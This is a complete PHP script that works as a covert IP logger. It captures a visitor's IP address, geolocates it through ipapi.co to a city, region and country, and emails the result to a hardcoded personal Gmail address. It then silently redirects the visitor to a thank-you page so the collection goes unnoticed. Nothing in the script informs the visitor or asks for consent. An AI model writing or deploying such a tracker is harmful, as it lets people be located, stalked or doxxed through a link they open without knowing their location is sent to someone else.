<?php
// Retrieve user's IP address
$user_ip = $_SERVER['REMOTE_ADDR'];

// Get location using ipapi.co
$location_data = file_get_contents("https://ipapi.co/{$user_ip}/json/");
$location = json_decode($location_data, true);

// Compose email message with location information
$email_subject = 'User Location';
$email_body = "User's IP Address: {$user_ip}\n";
$email_body .= "User's Location: {$location['city']}, {$location['region']}, {$location['country_name']}";

// Send email
$to = 'imobilejordan@gmail.com';
$subject = 'User Location';
$headers = 'From:imobilejordan@gmail.com';

// Use PHP's mail() function to send email
mail($to, $email_subject, $email_body, $headers);

// Redirect the user to a different page after email is sent
header('Location: http://example.com/thank-you.html');
exit;
?>
